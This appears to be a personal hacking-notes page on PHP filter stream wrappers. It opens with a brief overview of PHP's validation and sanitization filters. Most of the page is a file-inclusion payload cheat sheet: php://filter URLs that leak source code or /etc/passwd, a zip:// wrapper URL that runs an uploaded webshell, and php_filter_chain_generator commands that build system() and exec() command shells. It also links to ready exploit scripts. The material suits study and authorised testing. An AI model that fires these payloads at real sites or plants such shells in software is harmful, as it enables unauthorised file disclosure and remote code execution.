# PHP Filters

PHP Filters are a powerful wrappers of lots a functionality that take input and perform operations on it without developer having to write in-house checks, filters, etc against common input to website.
- [Validation Filters perform type and pattern checks](https://www.php.net/manual/en/filter.filters.validate.php)
- [Sanitization Filters perform string operations to modify unsafe input](https://www.php.net/manual/en/filter.filters.sanitize.php)
- [Only other is "callback" where all flags are ignored](https://www.php.net/manual/en/filter.filters.misc.php)
- [PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) provides developers to filter by builtin conditions-on-passed-input, encode the input.

Use cases in Hacking
```php
// base64 encode to bypass filters
?php://filter/convert.base64-encode/resource=$file

// code execution - requires `allow_url_include`
?php://data/text/plain,$urlencodePhpcode
```

- File inclusion vulnerabilities can exists due to how PHP filters are used with `include()`.
- PHP servers are vulnerable to RFI (Remote [[File-Inclusion]]) if the `allow_url_include` it set
- If [[HTML]] tags are missing and PHP is executing on the server we can use PHP filters to add `?php://filter/convert.base64-encode/resource=$CURRENTPAGE.php` to potential return the executed PHP back

#### BEWARE - PHP Filters may automatically append .php

Be aware that `php://filter` is a stream wrapper and how you are abusing `php://filters` maybe affected by source code; for example:
- Appending a file extension by default
- Checking what files are being streamed 

[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
```php
// only php://filter is case insensitive
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index
// unzip a .zip file that you have uploaded to the server somehow and execute a webshell 
http://example.com/index.php?file=zip:/var/www/html/exploit.zip%23cmd.php&cmd=whoami

// They can be chained together with:
// | or /
// Beware this probably wont work as .php may be appended
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
// base64encode only for limit exfil - buffer size 8192 bytes


```
- [PHP Documentation base64encode](https://www.php.net/manual/en/function.base64-encode.php)
- [Filter Chains can used to chain encodings till a desired payload - yikes](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
	- Generate PHP filter chains with [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
	- Junk characters do end up appended to the end
- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py)
- Consider [Hacktricks improvements on a Alles CTF script to get LFI2RCE via PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
```
No `system` no problem
```bash
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
```

## References

[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
[PHP Documentation base64encode](https://www.php.net/manual/en/function.base64-encode.php)
[Filter Chains Usage by Synacktiv](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
[LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py)
[Hacktricks improvements on a Alles CTF script to get LFI2RCE via PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
[Validation Filters](https://www.php.net/manual/en/filter.filters.validate.php)
[Sanitization Filters](https://www.php.net/manual/en/filter.filters.sanitize.php)
[Misc Filters](https://www.php.net/manual/en/filter.filters.misc.php)
[PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) 

